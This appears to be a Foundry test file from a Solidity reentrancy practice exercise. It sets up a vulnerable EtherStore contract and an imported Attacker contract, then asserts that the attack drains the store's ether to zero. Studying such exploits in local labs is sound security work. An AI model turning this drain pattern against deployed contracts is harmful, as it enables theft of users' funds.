pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/practice-attacker-1.sol";
import "../src/reenter-practice1.sol";

contract Exploit is Test{

    EtherStore store;
    Attacker attacker;
    function setUp() external{
        store = new EtherStore();
        attacker = new Attacker(address(store));

        vm.deal(address(store), 11 ether);
        vm.deal(address(attacker), 2 ether);
    
    }

    function testExploitPractice1() external {
        

        console.log(address(attacker).balance);

        vm.startPrank(address(attacker));
        attacker.attack{value: 1 ether}();
        vm.stopPrank();

        assert(address(store).balance == 0);

        uint finalBal = address(attacker).balance;
        console.log(address(attacker).balance);




    }
}
